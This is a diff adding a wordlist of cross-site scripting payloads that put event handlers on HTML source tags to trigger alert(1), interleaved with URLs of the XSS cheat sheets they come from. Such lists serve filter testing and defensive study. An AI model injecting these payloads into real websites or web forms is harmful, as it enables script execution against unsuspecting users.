@@ -1,0 +1,37 @@
+<source draggable="true" ondrag="alert(1)">test</source>
+<source draggable="true" ondragend="alert(1)">test</source>
+<source draggable="true" ondragenter="alert(1)">test</source>
+<source draggable="true" ondragleave="alert(1)">test</source>
+<source draggable="true" ondragstart="alert(1)">test</source>
+Source: https://cdn.jsdelivr.net/gh/tennc/xss/docs/xss03.md
+source: https://cdn.jsdelivr.net/gh/tennc/xss/docs/xss04.md
+source:https://cdn.jsdelivr.net/gh/tennc/xss/docs/xss05.md
+SOURCE: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+Source: https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45
+<source id=x tabindex=1 onactivate=alert(1)></source>
+<source id=x tabindex=1 onbeforeactivate=alert(1)></source>
+<source id=x tabindex=1 onbeforedeactivate=alert(1)></source><input autofocus>
+<source id=x tabindex=1 ondeactivate=alert(1)></source><input id=y autofocus>
+<source id=x tabindex=1 onfocus=alert(1)></source>
+<source id=x tabindex=1 onfocusin=alert(1)></source>
+<source onbeforecopy="alert(1)" contenteditable>test</source>
+<source onbeforecut="alert(1)" contenteditable>test</source>
+<source onbeforepaste="alert(1)" contenteditable>test</source>
+<source onblur=alert(1) tabindex=1 id=x></source><input autofocus>
+<source onclick="alert(1)">test</source>
+<source oncontextmenu="alert(1)">test</source>
+<source oncopy="alert(1)" contenteditable>test</source>
+<source oncut="alert(1)" contenteditable>test</source>
+<source ondblclick="alert(1)">test</source>
+<source onfocusout=alert(1) tabindex=1 id=x></source><input autofocus>
+<source onkeydown="alert(1)" contenteditable>test</source>
+<source onkeypress="alert(1)" contenteditable>test</source>
+<source onkeyup="alert(1)" contenteditable>test</source>
+<source onmousedown="alert(1)">test</source>
+<source onmouseenter="alert(1)">test</source>
+<source onmouseleave="alert(1)">test</source>
+<source onmousemove="alert(1)">test</source>
+<source onmouseout="alert(1)">test</source>
+<source onmouseover="alert(1)">test</source>
+<source onmouseup="alert(1)">test</source>
+<source onpaste="alert(1)" contenteditable>test</source>
